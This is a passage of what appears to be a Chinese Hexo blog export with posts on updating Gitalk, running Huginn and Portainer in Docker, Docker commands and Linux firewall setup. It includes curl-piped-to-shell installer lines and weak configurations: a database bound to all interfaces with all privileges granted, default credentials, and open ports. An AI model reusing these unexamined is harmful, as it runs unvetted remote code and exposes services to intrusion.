class="token string">'GitHub Application Client Secret'</span><span class="token punctuation">,</span>  accessToken<span class="token punctuation">:</span> <span class="token string">'Github Personal Access Token'</span><span class="token punctuation">,</span>   <span class="token comment" spellcheck="true">// IMPORTANT !!!</span>  repo<span class="token punctuation">:</span> <span class="token string">'GitHub repo'</span><span class="token punctuation">,</span>  owner<span class="token punctuation">:</span> <span class="token string">'GitHub repo owner'</span><span class="token punctuation">,</span>  <span class="token operator">...</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>根据 <a href="https://developer.github.com/apps/building-oauth-apps/understanding-scopes-for-oauth-apps/#available-scopes" target="_blank" rel="noopener">Understanding scopes for OAuth Apps</a> ，在<strong>新建 access token 时不选择任何选项</strong>，则生成的token只有<strong>公开信息的只读</strong>权限（<em>Grants read-only access to public information (includes public user profile info, public repository info, and gists)</em>）。</p><p>6号我也更新了这一版本，做了相应的修改，的确邮箱不被轰炸了。😂</p><p>但是，<strong>这个 access token 在任何人访问博客的时候都是公开可见的</strong>，不免存在风险，这也在issue里有过讨论。@geektutu 也说这是个临时方案。</p><p><img src="/2020/02/07/Blog_UpdateGitalk/issue2.png" alt="issue2"></p><h3 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h3><p>2月7日，这个issue的发起者 @fletchto99 给出了他的方案，并提了PR，详见：<a href="https://github.com/gitalk/gitalk/pull/346" target="_blank" rel="noopener">gitalk/gitalk#346</a> </p><p><img src="/2020/02/07/Blog_UpdateGitalk/issue3.png" alt="issue3"></p><p>利用原来的<code>client_id</code> 和 <code>client_secret</code> 作为 basic auth 是可行的。</p><p>按照他的方案，<strong>不需要修改其他的任何配置，直接把Gitalk的js升级到V1.5.2</strong> 即可。</p><p>这样就方便了很多哈，试了一下果然是可行的。</p><p>而且这个可以说是<strong>最佳方案</strong>了呢！</p><h2 id="针对-Matery-主题的修改"><a href="#针对-Matery-主题的修改" class="headerlink" title="针对 Matery 主题的修改"></a>针对 Matery 主题的修改</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>对于我现在使用的 <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank" rel="noopener">Matery</a> 主题（<em>hexo-theme-matery</em>），只需要将 <code>\hexo\themes\matery\source\libs\gitalk</code>目录下的 <code>gitalk.min.js</code>和 <code>gitalk.css</code> 更新到最新版本（&gt;= V1.5.2）即可。</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>当然也可以修改配置文件里引用的 JavaScript（、CSS）地址为链接版本。</p><p>目前 CDN 上的 Gitalk 已经更新到了最新版本。</p><p>打开<code>\hexo\themes\matery\_config.yml</code>，修改其中的 <code>libs</code>。</p><pre class=" language-yml"><code class="language-yml">libs:  css:    # ...    gitalk: https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.css    # 或者 https://unpkg.com/gitalk/dist/gitalk.css    # ...  js:    # ...    gitalk: https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js    # 或者 https://unpkg.com/gitalk/dist/gitalk.min.js     # ...</code></pre><p>保存后，在 hexo 的目录下执行 <code>hexo clean &amp;&amp; hexo g</code>，再部署即可。</p><hr><p>最后，顺手给 <em><a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank" rel="noopener">hexo-theme-matery</a></em> 提了个PR，更新了这一依赖，详见  <a href="https://github.com/blinkfox/hexo-theme-matery/pull/318" target="_blank" rel="noopener">blinkfox/hexo-theme-matery#318</a> 。</p><p><img src="/2020/02/07/Blog_UpdateGitalk/PR.png" alt="PR"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> blog </tag>
            
            <tag> Gitalk </tag>
            
            <tag> Life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于Docker搭建Huginn</title>
      <link href="/2020/02/03/Server_Huginn/"/>
      <url>/2020/02/03/Server_Huginn/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/02/03/Server_Huginn/Huginn.png" alt="Huginn"></p><h2 id="What-is-Huginn"><a href="#What-is-Huginn" class="headerlink" title="What is Huginn?"></a>What is Huginn?</h2><blockquote><p>Huginn is a system for building agents that perform automated tasks for  you online.  They can read the web, watch for events, and take actions  on your behalf.  Huginn’s Agents create and consume events, propagating  them along a directed graph.  Think of it as a hackable version of IFTTT or Zapier on your own server.  You always know who has your data.  You  do.</p></blockquote><blockquote><p>Huginn是一个神器，它是一个私人IFTTT，例如搭建任务采集触发平台，自动跟进实时提醒（用Email Slack Telegeram QQ  微信接收推送），全文 RSS 输出（把你关注的所有网页进行 RSS  全文输出），同时可以把各种app，软件，网络服务，网络设备等链接在一起做任务触发。 </p></blockquote><p>官方Github仓库：<a href="https://github.com/huginn/huginn" target="_blank" rel="noopener">https://github.com/huginn/huginn</a></p><p>这个是我在玩爬虫的时候，偶然间在网上看到的一个工具，能做的事情还不少，觉得还挺不错的，这次就试着搭建一下吧。  </p><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p>手动安装的话，需要下面这样一步步来，感觉好麻烦……（懒</p><blockquote><p>The Huginn installation consists of setting up the following components:   </p><ol><li>Packages / Dependencies</li><li>Ruby</li><li>System Users</li><li>Database</li><li>Huginn</li><li>Nginx</li></ol></blockquote><p>但是，Huginn还提供了一种通过docker来搭建的方式，可以免去配环境的烦恼，感觉贼好~</p><p>官方的文档在<a href="https://github.com/huginn/huginn/blob/master/doc/docker/install.md" target="_blank" rel="noopener">这里</a>。</p><h3 id="1-安装-Docker"><a href="#1-安装-Docker" class="headerlink" title="1. 安装 Docker"></a>1. 安装 Docker</h3><p>可以参考<a href="https://miaotony.xyz/2020/02/02/Server_Docker/">这里</a>。</p><h3 id="2-安装-Huginn"><a href="#2-安装-Huginn" class="headerlink" title="2. 安装 Huginn"></a>2. 安装 Huginn</h3><p>最简单的就直接</p><pre class=" language-bash"><code class="language-bash">docker run -it -p 3000:3000 huginn/huginn</code></pre><p>首先会把<code>huginn</code>给pull下来，然后运行。</p><p>然后访问 <a href="http://localhost:3000" target="_blank" rel="noopener">http://localhost:3000</a> 可以看到</p><p><img src="/2020/02/03/Server_Huginn/Huginn2.png" alt="登录界面"></p><h3 id="3-登录"><a href="#3-登录" class="headerlink" title="3. 登录"></a>3. 登录</h3><p>利用username <code>admin</code> and password <code>password</code>登录，之后可以在<code>Account</code>里进行修改。</p><p><img src="/2020/02/03/Server_Huginn/Huginn3.png" alt="登录后首页"></p><h3 id="4-配置开机自启"><a href="#4-配置开机自启" class="headerlink" title="4. 配置开机自启"></a>4. 配置开机自启</h3><pre class=" language-bash"><code class="language-bash">docker update --restart<span class="token operator">=</span>always huginn</code></pre><p>好了，接下来就可以<strong>尽情感受<code>huginn</code>的魅力</strong>了！</p><br><hr><br><h2 id="Connect-to-local-MySQL"><a href="#Connect-to-local-MySQL" class="headerlink" title="Connect to local MySQL"></a>Connect to local MySQL</h2><p>上面的安装方法是最简单的，默认会在Docker容器里安装MySQL数据库等环境。</p><p>但是如果本机就装了一个MySQL数据库，需要 huginn 共享的话，</p><p>或者说<strong>想要<code>huginn</code>连接到本地数据库</strong>，可以像下面这样安装。</p><h3 id="1-安装-Docker-1"><a href="#1-安装-Docker-1" class="headerlink" title="1. 安装 Docker"></a>1. 安装 Docker</h3><p>同上。</p><h3 id="2-配置-MySQL"><a href="#2-配置-MySQL" class="headerlink" title="2. 配置 MySQL"></a>2. 配置 MySQL</h3><h4 id="2-1-修改绑定的IP为-0-0-0-0"><a href="#2-1-修改绑定的IP为-0-0-0-0" class="headerlink" title="2.1 修改绑定的IP为 0.0.0.0"></a>2.1 修改绑定的IP为 <code>0.0.0.0</code></h4><p>这是为了让docker能连接到本地的数据库。</p><p>默认的 <code>127.0.0.1</code> 只能从本地访问。</p><p><strong>MySQL：</strong></p><pre class=" language-bash"><code class="language-bash">vim /etc/mysql/mysql.conf.d/mysqld.cnf</code></pre><p>修改</p><pre><code>bind-address = 0.0.0.0</code></pre><p>然后 重启</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl restart mysql </code></pre><p><strong>MariaDB：</strong></p><p><code>/etc/mysql/mariadb.cnf</code>包含了下面的所以<code>.cnf</code>文件</p><pre><code>!includedir /etc/mysql/conf.d/!includedir /etc/mysql/mariadb.conf.d/</code></pre><p>我这里的在下面这个文件里</p><pre class=" language-bash"><code class="language-bash">vim /etc/mysql/mariadb.conf.d/50-server.cnf</code></pre><p>同样修改 <code>bind-address = 0.0.0.0</code></p><p>而后 重启</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl restart mysql</code></pre><h4 id="2-2-MySQL里新建-huginn-用户"><a href="#2-2-MySQL里新建-huginn-用户" class="headerlink" title="2.2 MySQL里新建 huginn 用户"></a>2.2 MySQL里新建 <code>huginn</code> 用户</h4><p><strong>当然也可以让<code>huginn</code>直接以<code>root</code>用户来访问数据库，那就直接跳到2.3节。</strong></p><p>不过安全起见，还是新建一个用户吧。</p><p>以<code>root</code>登录MySQL / MariaDB</p><pre class=" language-bash"><code class="language-bash">mysql -u root -p</code></pre><p>新建<code>huginn</code>用户，密码为<code>PASSWORD</code></p><pre class=" language-mysql"><code class="language-mysql">create user 'huginn'@'%' identified by 'PASSWORD';</code></pre><p>这个是允许从任意地方登录。</p><p>如果要限制从<code>docker</code>里启动，先<code>ifconfig</code>看下 <code>docker0</code> 的IP，一般是<code>172.17.0.1</code>，则 docker IP 为<code>172.17.0.*</code>，于是</p><pre class=" language-mysql"><code class="language-mysql">create user 'huginn'@'172.17.0.%' identified by 'PASSWORD';</code></pre><h4 id="2-3-赋予权限"><a href="#2-3-赋予权限" class="headerlink" title="2.3 赋予权限"></a>2.3 赋予权限</h4><pre class=" language-mysql"><code class="language-mysql">GRANT ALL PRIVILEGES ON *.* TO 'huginn'@'172.17.0.%' IDENTIFIED BY 'PASSWORD' WITH GRANT OPTION;flush privileges;</code></pre><p>如果限制访问的数据库则修改<code>*.*</code>为相应的数据库即可。</p><h3 id="3-配置-firewall"><a href="#3-配置-firewall" class="headerlink" title="3. 配置 firewall"></a>3. 配置 firewall</h3><p>如果启用了 firewall 的话，需要放行本地的3306端口（即数据库的相应端口）。</p><p>Ubuntu：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw allow 3306</code></pre><p>CentOS：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd --zone<span class="token operator">=</span>public --add-port<span class="token operator">=</span>3306/tcp --permanent  <span class="token comment" spellcheck="true"># 开放端口</span><span class="token function">sudo</span> systemctl restart firewalld.service    <span class="token comment" spellcheck="true"># 重启firewall</span></code></pre><h3 id="4-安装-Huginn"><a href="#4-安装-Huginn" class="headerlink" title="4. 安装 Huginn"></a>4. 安装 Huginn</h3><p>首次安装：</p><pre class=" language-bash"><code class="language-bash">docker run  --name huginn \    -p 3000:3000 \    --restart always \    -e MYSQL_PORT_3306_TCP_ADDR<span class="token operator">=</span>172.17.0.1 \    -e HUGINN_DATABASE_NAME<span class="token operator">=</span>huginn \    -e HUGINN_DATABASE_USERNAME<span class="token operator">=</span>huginn \    -e HUGINN_DATABASE_PASSWORD<span class="token operator">=</span>PASSWORD \    huginn/huginn</code></pre><p>这里建了一个名为<code>huginn</code>的数据库。</p><p><code>172.17.0.1</code>是本地的IP，即在<code>ifconfig</code>看到的 <code>docker0</code> 的IP。确保在本地可以通过这个IP连上数据库。</p><p>之后直接这样即可↓。</p><pre class=" language-bash"><code class="language-bash">docker start huginn</code></pre><p>上面首次安装时已经配置了开机自启。</p><p>当然也可以这样配置——</p><pre class=" language-bash"><code class="language-bash">docker update --restart<span class="token operator">=</span>always huginn</code></pre><p>好了，完工！</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/huginn/huginn" target="_blank" rel="noopener">https://github.com/huginn/huginn</a></p><p><a href="https://www.jianshu.com/p/d272a09ba686" target="_blank" rel="noopener">https://www.jianshu.com/p/d272a09ba686</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Server </tag>
            
            <tag> Docker </tag>
            
            <tag> tips </tag>
            
            <tag> Huginn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker安装及常用命令</title>
      <link href="/2020/02/02/Server_Docker/"/>
      <url>/2020/02/02/Server_Docker/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/02/02/Server_Docker/docker.gif" alt="docker图标"></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>Building and deploying new applications is faster with containers.<br>Docker containers wrap up software and its dependencies into a  standardized unit for software development that includes everything it  needs to run: code, runtime, system tools and libraries. This guarantees that your application will always run the same and makes collaboration  as simple as sharing a container image.</p></blockquote><blockquote><p>Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。</p><p>Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</p><p>容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。</p></blockquote><p>其实感觉上就是emmm</p><p>别人把整套环境都配置好打包好了，你直接拿过来用就好了！</p><p>反正用起来贼方便就是了。</p><p><img src="/2020/02/02/Server_Docker/docker2.png" alt="图标"></p><p>感觉docker的图标就挺好看的（</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre class=" language-bash"><code class="language-bash">curl -fsSL get.docker.com -o get-docker.sh<span class="token function">sudo</span> sh get-docker.sh --mirror Aliyun</code></pre><p>Windows下下载Docker Desktop</p><p><a href="https://www.docker.com/products/docker-desktop" target="_blank" rel="noopener">https://www.docker.com/products/docker-desktop</a></p><p>（要登陆）</p><h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><p>Linux下，编辑此文件，如果没有则新建。</p><pre class=" language-bash"><code class="language-bash">vim /etc/docker/daemon.json</code></pre><p>Windows下文件为：</p><pre><code>%programdata%\docker\config\daemon.json</code></pre><h3 id="USTC-中科大源（推荐！）"><a href="#USTC-中科大源（推荐！）" class="headerlink" title="USTC 中科大源（推荐！）"></a>USTC 中科大源<strong>（推荐！）</strong></h3><p><a href="https://lug.ustc.edu.cn/wiki/mirrors/help/docker" target="_blank" rel="noopener">https://lug.ustc.edu.cn/wiki/mirrors/help/docker</a></p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"https://docker.mirrors.ustc.edu.cn"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h3 id="Azure-中国镜像"><a href="#Azure-中国镜像" class="headerlink" title="Azure 中国镜像"></a>Azure 中国镜像</h3><p><a href="https://github.com/Azure/container-service-for-azure-china/blob/master/aks/README.md#22-container-registry-proxy" target="_blank" rel="noopener">https://github.com/Azure/container-service-for-azure-china/blob/master/aks/README.md#22-container-registry-proxy</a></p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"https://dockerhub.azk8s.cn"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h3 id="DaoCloud-源"><a href="#DaoCloud-源" class="headerlink" title="DaoCloud 源"></a>DaoCloud 源</h3><p><a href="https://www.daocloud.io/mirror" target="_blank" rel="noopener">https://www.daocloud.io/mirror</a></p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"http://f1361db2.m.daocloud.io"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>或者 直接执行这个就可以一键修改</p><pre class=" language-bash"><code class="language-bash">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh <span class="token operator">|</span> sh -s http://f1361db2.m.daocloud.io</code></pre><h3 id="163网易源"><a href="#163网易源" class="headerlink" title="163网易源"></a>163网易源</h3><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token string">"http://hub-mirror.c.163.com"</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h3 id="阿里源"><a href="#阿里源" class="headerlink" title="阿里源"></a>阿里源</h3><p>要注册，略。</p><h3 id="配置多个镜像"><a href="#配置多个镜像" class="headerlink" title="配置多个镜像"></a>配置多个镜像</h3><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token string">"https://docker.mirrors.ustc.edu.cn"</span><span class="token punctuation">,</span>    <span class="token string">"https://dockerhub.azk8s.cn/"</span><span class="token punctuation">,</span>    <span class="token string">"http://hub-mirror.c.163.com"</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>注意遵循<code>json</code>格式。</p><h3 id="配置完之后重启服务"><a href="#配置完之后重启服务" class="headerlink" title="配置完之后重启服务"></a>配置完之后重启服务</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl daemon-reload<span class="token function">sudo</span> systemctl restart docker</code></pre><h3 id="检查加速器是否生效"><a href="#检查加速器是否生效" class="headerlink" title="检查加速器是否生效"></a>检查加速器是否生效</h3><p>有如下信息则配置成功。</p><p><img src="/2020/02/02/Server_Docker/mirror.png" alt="mirrors"></p><hr><h2 id="Portainer"><a href="#Portainer" class="headerlink" title="Portainer"></a>Portainer</h2><blockquote><p>Portainer 是 Docker 的图形化管理工具，提供状态显示面板、应用模板快速部署、容器镜像网络数据卷的基本操作（包括上传下载镜像，创建容器等操作）、事件日志显示、容器控制台操作、Swarm集群和服务等集中管理和操作、登录用户管理和控制等功能。功能十分全面，基本能满足中小型单位对容器管理的全部需求。</p></blockquote><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 拉取镜像</span>docker pull portainer/portainer<span class="token comment" spellcheck="true"># 一键部署</span>docker volume create portainer_datadocker run -d -p 9000:9000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer</code></pre><p>访问 <a href="http://127.0.0.1:9000" target="_blank" rel="noopener">http://127.0.0.1:9000</a> 即可访问图形化面板。配置好用户名、密码后登录。</p><p><img src="/2020/02/02/Server_Docker/portainer.png" alt="登录界面"></p><p>连接到Local，登录后的主界面如下。</p><p><img src="/2020/02/02/Server_Docker/portainer2.png" alt="Home"></p><h3 id="通过远程访问"><a href="#通过远程访问" class="headerlink" title="通过远程访问"></a>通过远程访问</h3><p>需要在防火墙放行9000端口。</p><p>Ubuntu:</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw allow 9000  </code></pre><p>CentOS:（其实也可以装个 ufw 的）</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd --zone<span class="token operator">=</span>public --add-port<span class="token operator">=</span>9000/tcp --permanent  <span class="token comment" spellcheck="true"># 开放端口</span><span class="token function">sudo</span> systemctl restart firewalld.service    <span class="token comment" spellcheck="true"># 重启firewall</span></code></pre><h3 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h3><pre class=" language-bash"><code class="language-bash">docker update --restart<span class="token operator">=</span>always portainer</code></pre><p>其实在上面的一键部署命令中已经加了，这里不需要了。（记录一下而已）</p><hr><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="系统相关"><a href="#系统相关" class="headerlink" title="系统相关"></a>系统相关</h3><h4 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h4><pre class=" language-bash"><code class="language-bash">docker info</code></pre><h4 id="查看镜像、容器、数据卷所占用的空间"><a href="#查看镜像、容器、数据卷所占用的空间" class="headerlink" title="查看镜像、容器、数据卷所占用的空间"></a>查看镜像、容器、数据卷所占用的空间</h4><pre class=" language-bash"><code class="language-bash">docker system <span class="token function">df</span></code></pre><hr><h3 id="容器相关"><a href="#容器相关" class="headerlink" title="容器相关"></a>容器相关</h3><h4 id="查看当前容器"><a href="#查看当前容器" class="headerlink" title="查看当前容器"></a>查看当前容器</h4><pre class=" language-bash"><code class="language-bash">docker <span class="token function">ps</span> -a</code></pre><h4 id="创建-amp-使用容器"><a href="#创建-amp-使用容器" class="headerlink" title="创建&amp;使用容器"></a>创建&amp;使用容器</h4><pre class=" language-bash"><code class="language-bash">docker run -it --name 容器名 镜像名/镜像ID /bin/bash</code></pre><p>使用 <code>-d</code> 参数运行容器，可以让容器在后台运行而不把STDOUT输出到宿主机上。</p><p>（用<code>docker logs [container ID or NAMES]</code>查看）</p><p>当 <code>-i</code> <code>-t</code> 参数一起使用时，可以看到 Linux 命令提示符，如<code>root@69d137adef7a:/#</code>。只有 <code>-i</code>则没有命令提示符。</p><h4 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h4><pre class=" language-bash"><code class="language-bash">docker start 容器名/容器ID</code></pre><h4 id="重启容器"><a href="#重启容器" class="headerlink" title="重启容器"></a>重启容器</h4><pre class=" language-bash"><code class="language-bash">docker restart 容器名/容器ID</code></pre><h4 id="终止容器"><a href="#终止容器" class="headerlink" title="终止容器"></a>终止容器</h4><pre class=" language-bash"><code class="language-bash">docker stop 容器名/容器ID</code></pre><h4 id="查看容器信息"><a href="#查看容器信息" class="headerlink" title="查看容器信息"></a>查看容器信息</h4><pre class=" language-bash"><code class="language-bash">docker container <span class="token function">ls</span> -a</code></pre><h4 id="容器统计信息"><a href="#容器统计信息" class="headerlink" title="容器统计信息"></a>容器统计信息</h4><pre class=" language-bash"><code class="language-bash">docker stats</code></pre><h4 id="启动已终止容器"><a href="#启动已终止容器" class="headerlink" title="启动已终止容器"></a>启动已终止容器</h4><pre class=" language-bash"><code class="language-bash">docker container start</code></pre><h4 id="获取容器的输出信息"><a href="#获取容器的输出信息" class="headerlink" title="获取容器的输出信息"></a>获取容器的输出信息</h4><pre class=" language-bash"><code class="language-bash">docker container logs <span class="token punctuation">[</span>container ID or NAMES<span class="token punctuation">]</span></code></pre><h4 id="进入容器（连接容器）"><a href="#进入容器（连接容器）" class="headerlink" title="进入容器（连接容器）"></a>进入容器（连接容器）</h4><pre class=" language-bash"><code class="language-bash">docker <span class="token function">exec</span> -it 容器名/容器ID /bin/bash</code></pre><p>从这个 stdin 中 exit，不会导致容器的停止。<strong>（推荐↑）</strong></p><p>而下面这个，从这个 stdin 中 exit，会导致容器的停止。</p><pre class=" language-bash"><code class="language-bash">docker attach 容器名/容器ID</code></pre><h4 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h4><pre class=" language-bash"><code class="language-bash">docker <span class="token function">rm</span> 容器名/容器ID</code></pre><hr><h3 id="镜像相关"><a href="#镜像相关" class="headerlink" title="镜像相关"></a>镜像相关</h3><h4 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h4><pre class=" language-bash"><code class="language-bash">docker search 关键词</code></pre><h4 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h4><pre class=" language-bash"><code class="language-bash">docker pull 镜像名</code></pre><p><code>镜像名:Tag</code> 可以下载不同标签的镜像。</p><h4 id="查看已下载镜像"><a href="#查看已下载镜像" class="headerlink" title="查看已下载镜像"></a>查看已下载镜像</h4><pre class=" language-bash"><code class="language-bash">docker images -a<span class="token comment" spellcheck="true"># 或者 docker image ls</span></code></pre><h4 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h4><pre class=" language-bash"><code class="language-bash">docker rmi <span class="token punctuation">[</span>Image ID<span class="token punctuation">]</span></code></pre><hr><h3 id="端口相关"><a href="#端口相关" class="headerlink" title="端口相关"></a>端口相关</h3><h4 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h4><p>将docker内的80端口映射到宿主机的8000端口上</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 可以使用--name自定义部署的容器名</span>docker run -d -p 8000:80 --name 容器名 镜像名<span class="token comment" spellcheck="true"># 也可以直接通过镜像部署</span>docker run -d -p 8000:80 镜像名</code></pre><p><em>（别急，慢慢学好了啦……</em></p><hr><h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><p><strong>Docker从入门到实践 GitBook</strong>  <a href="https://yeasy.gitbooks.io/docker_practice/content/" target="_blank" rel="noopener">https://yeasy.gitbooks.io/docker_practice/content/</a></p><p>Docker-镜像常用命令 <a href="https://blog.csdn.net/y472360651/article/details/81289088" target="_blank" rel="noopener">https://blog.csdn.net/y472360651/article/details/81289088</a></p><p>Docker温故知新 <a href="https://www.sqlsec.com/2019/10/docker2.html" target="_blank" rel="noopener">https://www.sqlsec.com/2019/10/docker2.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Server </tag>
            
            <tag> Docker </tag>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Firewall &amp; Port Configuration</title>
      <link href="/2020/01/29/Server_firewall/"/>
      <url>/2020/01/29/Server_firewall/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在配服务器环境的时候，动不动遇到端口无法访问的情况，折腾了老半天，经过分析判断最后基本是防火墙把网络端口给拦了……</p><p>于是就来简要记录一下Linux下的防火墙配置，以及端口开放、关闭的配置方法。</p><p>整理自网络啦。</p><hr><h2 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h2><p>CentOS下用的是<code>firewall-cmd</code></p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><h4 id="启动firewall"><a href="#启动firewall" class="headerlink" title="启动firewall"></a>启动firewall</h4><pre class=" language-bash"><code class="language-bash">systemctl start firewalld.service</code></pre><h4 id="开机自启firewall"><a href="#开机自启firewall" class="headerlink" title="开机自启firewall"></a>开机自启firewall</h4><pre class=" language-bash"><code class="language-bash">systemctl <span class="token function">enable</span> firewalld.service</code></pre><h4 id="查看开机自启是否设置成功"><a href="#查看开机自启是否设置成功" class="headerlink" title="查看开机自启是否设置成功"></a>查看开机自启是否设置成功</h4><pre class=" language-bash"><code class="language-bash">systemctl is-enabled firewalld.service<span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$?</span></code></pre><blockquote><p>返回如下则开启成功</p><pre><code>enabled0</code></pre></blockquote><h4 id="重启firewall"><a href="#重启firewall" class="headerlink" title="重启firewall"></a>重启firewall</h4><pre class=" language-bash"><code class="language-bash">systemctl restart firewalld.service</code></pre><h4 id="关闭firewall"><a href="#关闭firewall" class="headerlink" title="关闭firewall"></a>关闭firewall</h4><pre class=" language-bash"><code class="language-bash">systemctl stop firewalld.service</code></pre><h4 id="检测firewall状态"><a href="#检测firewall状态" class="headerlink" title="检测firewall状态"></a>检测firewall状态</h4><pre class=" language-bash"><code class="language-bash">firewall-cmd --state</code></pre><blockquote><p>例如正在运行：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># firewall-cmd --state</span>running</code></pre><p>不在运行则为<code>not running</code></p></blockquote><h3 id="端口配置"><a href="#端口配置" class="headerlink" title="端口配置"></a>端口配置</h3><h4 id="查看开放（监听）的端口"><a href="#查看开放（监听）的端口" class="headerlink" title="查看开放（监听）的端口"></a>查看开放（监听）的端口</h4><pre class=" language-bash"><code class="language-bash">firewall-cmd --list-ports</code></pre><blockquote><p>example：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># firewall-cmd --list-ports</span>80/tcp 7650/tcp 3306/tcp</code></pre></blockquote><p>或</p><pre class=" language-bash"><code class="language-bash"><span class="token function">netstat</span> 